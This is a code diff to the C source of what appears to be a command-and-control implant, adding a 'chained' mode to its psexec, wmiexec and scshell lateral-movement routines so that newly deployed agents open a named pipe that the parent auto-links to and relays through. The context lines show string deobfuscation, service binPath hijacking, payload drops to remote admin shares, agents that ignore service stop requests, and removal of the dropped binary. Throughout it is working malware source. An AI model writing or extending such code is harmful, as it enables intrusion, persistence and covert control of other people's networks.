@@ -996,6 +996,9 @@ typedef BOOL      (WINAPI *fn_QueryServiceConfigW)(SC_HANDLE, LPQUERY_SERVICE_CO
 typedef BOOL      (WINAPI *fn_CopyFileW)(LPCWSTR, LPCWSTR, BOOL);
 typedef BOOL      (WINAPI *fn_DeleteFileW)(LPCWSTR);
 
+/* Forward declaration — defined after link infrastructure */
+static BOOL _jump_autolink(Buffer *out, const wchar_t *target, const char *pipename);
+
 /* Generate pseudo-random alphanumeric name */
 static void _jump_randname(char *buf, int len) {
     static const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -1010,7 +1013,8 @@ static void _jump_randname(char *buf, int len) {
 }
 
 static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
-                         const unsigned char *payload, DWORD payload_len) {
+                         const unsigned char *payload, DWORD payload_len,
+                         BOOL chained) {
     char _da[] = S_ADVAPI32_DLL; _DEOBF(_da);
     char _dk[] = S_KERNEL32_DLL; _DEOBF(_dk);
     HMODULE hAdv = LoadLibraryA(_da);
@@ -1077,11 +1081,19 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
     }
 
     /* 3. Create service with random name */
+    char pipe_name[32] = {0};
+    if (chained) {
+        _jump_randname(pipe_name, 12);
+    }
+
     wchar_t svcName[16], binPath[512];
     wchar_t wRname[16];
     MultiByteToWideChar(CP_UTF8, 0, rname, -1, wRname, 16);
     swprintf(svcName, 16, L"%ls", wRname);
-    swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
+    if (chained)
+        swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe PIPE:%hs", rname, pipe_name);
+    else
+        swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
 
     SC_HANDLE hSvc = pCreateSvc(hSCM, svcName, NULL,
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
@@ -1123,11 +1135,22 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
 
     snprintf(msg, sizeof(msg), "[+] Service started and cleaned up on %ls\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
+
+    /* 6. Auto-link in chained mode */
+    if (chained && pipe_name[0] != '\0') {
+        BUF_STR(out, "[*] Waiting for child agent to initialize pipe...\n");
+        Sleep(2000);
+        if (!_jump_autolink(out, target, pipe_name)) {
+            BUF_STR(out, "[!] Auto-link failed — child may still check in directly\n");
+        }
+    }
+
     return TRUE;
 }
 
 static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
-                          const unsigned char *payload, DWORD payload_len) {
+                          const unsigned char *payload, DWORD payload_len,
+                          BOOL chained) {
     /* scshell: hijack existing service's binPath, no file drop.
      * We change a stopped service's binPath to run the agent from a UNC path
      * or from a one-liner. The payload bytes are the agent binary — we need
@@ -1250,9 +1273,20 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
      * StartServiceCtrlDispatcherW succeeds (SHARE_PROCESS requires
      * matching service name which we can't know at compile time).
      * The agent's _svc_ctrl_handler ignores STOP so SCM can't
-     * kill us cooperatively — we stay alive indefinitely. */
+     * kill us cooperatively — we stay alive indefinitely.
+     *
+     * Chained mode: append "PIPE:<name>" so the child creates a named
+     * pipe and waits for us to auto-link. */
+    char pipe_name[32] = {0};
+    if (chained) {
+        _jump_randname(pipe_name, 12);
+    }
+
     wchar_t newBinPath[512];
-    swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs", fname);
+    if (chained)
+        swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs PIPE:%hs", fname, pipe_name);
+    else
+        swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs", fname);
     pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
@@ -1287,6 +1321,16 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
 
     snprintf(msg, sizeof(msg), "[+] Service started on %ls\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
+
+    /* 8. Auto-link in chained mode */
+    if (chained && pipe_name[0] != '\0') {
+        BUF_STR(out, "[*] Waiting for child agent to initialize pipe...\n");
+        Sleep(2000); /* Give child time to reach CreateNamedPipeW */
+        if (!_jump_autolink(out, target, pipe_name)) {
+            BUF_STR(out, "[!] Auto-link failed — child may still check in directly\n");
+        }
+    }
+
     return TRUE;
 }
 
@@ -1444,7 +1488,8 @@ typedef void    (WINAPI *fn_VariantInit_t)(_VARIANT *);
 typedef HRESULT (WINAPI *fn_VariantClear_t)(_VARIANT *);
 
 static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
-                          const unsigned char *payload, DWORD payload_len) {
+                          const unsigned char *payload, DWORD payload_len,
+                          BOOL chained) {
     /* WMI lateral movement via COM/DCOM.
      * Upload payload to \\target\C$\Windows\Temp\<rand>.exe
      * then execute via Win32_Process.Create over DCOM.
@@ -1594,9 +1639,17 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     _IWbemClassObject *pInInst = NULL;
     pInParams->lpVtbl->SpawnInstance(pInParams, 0, (void **)&pInInst);
 
-    /* Set CommandLine = "C:\Windows\Temp\<rand>.exe" */
+    /* Set CommandLine = "C:\Windows\Temp\<rand>.exe [PIPE:<name>]" */
+    char pipe_name[32] = {0};
+    if (chained) {
+        _jump_randname(pipe_name, 12);
+    }
+
     wchar_t cmdLine[512];
-    swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe", rname);
+    if (chained)
+        swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe PIPE:%hs", rname, pipe_name);
+    else
+        swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe", rname);
     _VARIANT vCmd;
     pVarInit(&vCmd);
     vCmd.vt = VT_BSTR;
@@ -1651,6 +1704,14 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
         Sleep(3000);
         pDeleteFile(remotePath);
         BUF_STR(out, "[+] Remote binary cleaned up\n");
+
+        /* Auto-link in chained mode */
+        if (chained && pipe_name[0] != '\0') {
+            BUF_STR(out, "[*] Waiting for child agent to initialize pipe...\n");
+            if (!_jump_autolink(out, target, pipe_name)) {
+                BUF_STR(out, "[!] Auto-link failed — child may still check in directly\n");
+            }
+        }
     } else {
         pDeleteFile(remotePath);
     }
@@ -1663,9 +1724,13 @@ void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
         return;
     }
 
-    /* Parse wire format */
+    /* Parse wire format:
+     *   [1B method] [1B flags] [4B target_len] [target\0] [4B payload_len] [payload]
+     * flags bit 0: server-connection (1=direct to C2, 0=chained via pipe)
+     */
     DWORD off = 0;
     BYTE method = args[off++]; /* 0=psexec, 1=wmiexec, 2=scshell */
+    BYTE flags  = args[off++]; /* bit 0: server-connection */
 
     DWORD tgt_len = *(DWORD *)(args + off); off += 4;
     if (off + tgt_len > args_len) {
@@ -1694,14 +1759,16 @@ void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
     char msg[256];
     const char *method_names[] = {"psexec", "wmiexec", "scshell"};
     if (method > 2) { BUF_STR(out, "[-] Unknown jump method\n"); return; }
-    snprintf(msg, sizeof(msg), "[*] jump %s → %s (%lu byte payload)\n",
-             method_names[method], target, payload_len);
+    BOOL chained = !(flags & 0x01);
+    snprintf(msg, sizeof(msg), "[*] jump %s → %s (%lu bytes, %s)\n",
+             method_names[method], target, payload_len,
+             chained ? "chained" : "server-connection");
     buf_append(out, msg, (DWORD)strlen(msg));
 
     switch (method) {
-        case 0: _jump_psexec(out, wTarget, payload, payload_len); break;
-        case 1: _jump_wmiexec(out, wTarget, payload, payload_len); break;
-        case 2: _jump_scshell(out, wTarget, payload, payload_len); break;
+        case 0: _jump_psexec(out, wTarget, payload, payload_len, chained); break;
+        case 1: _jump_wmiexec(out, wTarget, payload, payload_len, chained); break;
+        case 2: _jump_scshell(out, wTarget, payload, payload_len, chained); break;
     }
 }
 
@@ -1814,6 +1881,90 @@ static DWORD WINAPI _link_relay_thread(LPVOID param) {
     InterlockedExchange(&_linked[idx].active, 0);
     InterlockedDecrement(&_linked_count);
     return 0;
+}
+
+/*
+ * _jump_autolink — connect to child pipe after StartService/WMI Create.
+ * Reuses the link infrastructure (mod_link's relay thread).
+ * Retries up to 15 times with 1s delay to give child time to init.
+ */
+static BOOL _jump_autolink(Buffer *out, const wchar_t *target, const char *pipename) {
+    _link_init_once();
+
+    /* Find free slot */
+    int slot = -1;
+    for (int i = 0; i < MAX_LINKED_AGENTS; i++) {
+        if (!_linked[i].active && _linked[i].hPipe == INVALID_HANDLE_VALUE) {
+            slot = i;
+            break;
+        }
+    }
+    if (slot < 0) {
+        BUF_STR(out, "[-] No free link slots for auto-link\n");
+        return FALSE;
+    }
+
+    /* Build UNC pipe path: \\target\pipe\pipename */
+    char narrow_target[256] = {0};
+    WideCharToMultiByte(CP_UTF8, 0, target, -1, narrow_target, 256, NULL, NULL);
+    char pipe_path[512];
+    snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s", narrow_target, pipename);
+
+    wchar_t wPipePath[512];
+    MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);
+
+    char msg[512];
+    snprintf(msg, sizeof(msg), "[*] Auto-linking to %s ...\n", pipe_path);
+    buf_append(out, msg, (DWORD)strlen(msg));
+
+    /* Connect with retry — child needs time to CreateNamedPipeW */
+    HANDLE hPipe = INVALID_HANDLE_VALUE;
+    for (int attempt = 0; attempt < 15; attempt++) {
+        hPipe = CreateFileW(
+            wPipePath,
+            GENERIC_READ | GENERIC_WRITE,
+            0, NULL, OPEN_EXISTING, 0, NULL
+        );
+        if (hPipe != INVALID_HANDLE_VALUE) break;
+
+        DWORD err = GetLastError();
+        if (err == ERROR_PIPE_BUSY)
+            WaitNamedPipeW(wPipePath, 3000);
+        else
+            Sleep(1000);
+    }
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        snprintf(msg, sizeof(msg), "[-] Auto-link failed: %s (err=%lu)\n", pipe_path, err);
+        buf_append(out, msg, (DWORD)strlen(msg));
+        return FALSE;
+    }
+
+    /* Set pipe to byte mode */
+    DWORD mode = PIPE_READMODE_BYTE;
+    SetNamedPipeHandleState(hPipe, &mode, NULL, NULL);
+
+    /* Store and start relay thread */
+    _linked[slot].hPipe = hPipe;
+    InterlockedExchange(&_linked[slot].active, 1);
+    strncpy(_linked[slot].target, narrow_target, 255);
+    strncpy(_linked[slot].pipename, pipename, 255);
+
+    _linked[slot].hThread = CreateThread(NULL, 0, _link_relay_thread,
+                                         (LPVOID)(intptr_t)slot, 0, NULL);
+    if (!_linked[slot].hThread) {
+        CloseHandle(hPipe);
+        _linked[slot].hPipe = INVALID_HANDLE_VALUE;
+        InterlockedExchange(&_linked[slot].active, 0);
+        BUF_STR(out, "[-] Failed to start relay thread\n");
+        return FALSE;
+    }
+
+    InterlockedIncrement(&_linked_count);
+    snprintf(msg, sizeof(msg), "[+] Auto-linked to %s (slot %d)\n", pipe_path, slot);
+    buf_append(out, msg, (DWORD)strlen(msg));
+    return TRUE;
 }
 
 void mod_link(Buffer *out, const unsigned char *args, DWORD args_len) {
